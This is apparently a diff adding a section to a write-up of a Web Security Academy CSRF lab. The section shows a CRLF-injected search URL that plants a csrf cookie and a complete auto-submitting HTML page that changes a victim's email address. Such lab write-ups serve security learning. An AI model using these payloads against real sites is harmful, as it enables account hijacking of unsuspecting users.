@@ -128,3 +128,34 @@ Deliver this payload with our pre-created `csrf` value generated with provided `
 	</body>
 <html>
 ```
+
+## CSRF where token is duplicated in cookie
+
+Similarly to previous lab we can set the cookie for the user making a get request:
+```
+https://0a6d00910467fbba83795ae0001e0069.web-security-academy.net/?search=A%0d%0aSet-Cookie:+csrf=CustomCSRFToken;%20SameSite=None
+```
+
+Now as we know the value of `csrf` cookie (because we set it), we can bypass `double submit` csrf protection and make a request with our `CustomCSRFToken` in the body (as the cookie with the same value will be sent along).
+
+Sent this payload to the victim:
+```
+<html>
+	<body>
+        <!-- Perform changing csrf cookie GET request -->
+        <img src="https://0a6d00910467fbba83795ae0001e0069.web-security-academy.net/?search=A%0d%0aSet-Cookie:+csrf=CustomCSRFToken;%20SameSite=None" alt="Redirecting...">
+
+		<form method="POST" action="https://0a6d00910467fbba83795ae0001e0069.web-security-academy.net/my-account/change-email">
+			<input type="hidden" name="email" value="pwned@email.com"/>
+			<input type="hidden" name="csrf" value="CustomCSRFToken"/>
+		</form>
+
+        <script>
+            <!-- Wait until csrf cookie is changed and make a POST request changing email -->
+            window.addEventListener("load", ()=>{
+                document.forms[0].submit()
+            })
+        </script>
+	</body>
+<html>
+```
